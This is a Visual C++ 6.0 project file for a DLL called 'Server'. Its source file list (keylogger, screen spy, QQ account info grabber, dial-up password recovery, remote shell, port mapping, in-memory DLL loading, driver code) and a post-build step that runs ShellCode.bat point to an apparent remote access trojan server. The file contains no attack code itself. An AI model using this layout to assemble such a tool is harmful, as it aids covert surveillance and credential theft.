# Microsoft Developer Studio Project File - Name="Server" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Dynamic-Link Library" 0x0102

CFG=Server - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Server.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Server.mak" CFG="Server - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Server - Win32 Release" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE "Server - Win32 Debug" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "Server - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /YX /FD /c
# ADD CPP /nologo /MD /w /W0 /GX /Zd /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /dll /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /dll /machine:I386 /nodefaultlib:"libcmt" /mapinfo:lines
# SUBTRACT LINK32 /pdb:none
# Begin Special Build Tool
SOURCE="$(InputPath)"
PostBuild_Cmds=copy /Y Release\Server.dll ..\Install\Server.dll	cd ..\Install	ShellCode.bat
# End Special Build Tool

!ELSEIF  "$(CFG)" == "Server - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /YX /FD /GZ /c
# ADD CPP /nologo /MTd /w /W0 /Gm /GX /ZI /Od /I "C:\Program Files\Visual Leak Detector\include" /I "C:\Program Files (x86)\Visual Leak Detector\include" /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /Yu"stdafx.h" /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /dll /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept /libpath:"C:\Program Files\Visual Leak Detector\lib" /libpath:"C:\Program Files (x86)\Visual Leak Detector\lib"
# SUBTRACT LINK32 /pdb:none
# Begin Special Build Tool
SOURCE="$(InputPath)"
PostBuild_Cmds=copy /Y Debug\Server.exe ..\Bin\Cache\Install.dat	copy /Y Debug\Server.pdb ..\Bin\Cache\Server.pdb
# End Special Build Tool

!ENDIF 

# Begin Target

# Name "Server - Win32 Release"
# Name "Server - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat;asm"
# Begin Source File

SOURCE=.\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ChatManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\cJSON.c
# SUBTRACT CPP /YX /Yc /Yu
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.cpp
# End Source File
# Begin Source File

SOURCE=.\common\DllManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\FileFinder.cpp
# End Source File
# Begin Source File

SOURCE=.\common\FileManager.cpp
# End Source File
# Begin Source File

SOURCE=.\GetNetState.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Manager.cpp
# End Source File
# Begin Source File

SOURCE=.\Myfunction.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Path.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ProxyManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\QQInfoManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Registry.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.cpp
# End Source File
# Begin Source File

SOURCE=.\common\SerManager.cpp
# End Source File
# Begin Source File

SOURCE=.\Server.cpp
# End Source File
# Begin Source File

SOURCE=.\Server.rc
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\common\SysInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\until.cpp
# End Source File
# Begin Source File

SOURCE=.\xvidsdk\XvidEnc.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ZXPortMap.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl;inc"
# Begin Source File

SOURCE=.\common\Audio.h
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.h
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\common\ChatManager.h
# End Source File
# Begin Source File

SOURCE=.\common\cJSON.h
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.h
# End Source File
# Begin Source File

SOURCE=.\Declare.h
# End Source File
# Begin Source File

SOURCE=.\decode.h
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.h
# End Source File
# Begin Source File

SOURCE=.\common\DllManager.h
# End Source File
# Begin Source File

SOURCE=.\DriverCode32.h
# End Source File
# Begin Source File

SOURCE=.\DriverCode64.h
# End Source File
# Begin Source File

SOURCE=.\common\FileFinder.h
# End Source File
# Begin Source File

SOURCE=.\common\FileManager.h
# End Source File
# Begin Source File

SOURCE=.\GetNetState.h
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.h
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.h
# End Source File
# Begin Source File

SOURCE=.\common\keylog.h
# End Source File
# Begin Source File

SOURCE=.\common\login.h
# End Source File
# Begin Source File

SOURCE=.\common\loop.h
# End Source File
# Begin Source File

SOURCE=.\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\common\Manager.h
# End Source File
# Begin Source File

SOURCE=.\common\MemLoadDll.h
# End Source File
# Begin Source File

SOURCE=.\Myfunction.h
# End Source File
# Begin Source File

SOURCE=.\common\MyGnonen.h
# End Source File
# Begin Source File

SOURCE=.\common\Path.h
# End Source File
# Begin Source File

SOURCE=.\common\Proxy.h
# End Source File
# Begin Source File

SOURCE=.\common\ProxyManager.h
# End Source File
# Begin Source File

SOURCE=.\common\QQInfoManager.h
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.h
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.h
# End Source File
# Begin Source File

SOURCE=.\common\Registry.h
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.h
# End Source File
# Begin Source File

SOURCE=.\resource.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.h
# End Source File
# Begin Source File

SOURCE=.\common\SerManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\common\SysInfo.h
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.h
# End Source File
# Begin Source File

SOURCE=.\common\until.h
# End Source File
# Begin Source File

SOURCE=.\common\Wit.h
# End Source File
# Begin Source File

SOURCE=.\xvidsdk\XvidEnc.h
# End Source File
# Begin Source File

SOURCE=.\common\ZXPortMap.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\127.ico
# End Source File
# Begin Source File

SOURCE=.\128.ico
# End Source File
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\xp.xml
# End Source File
# End Target
# End Project
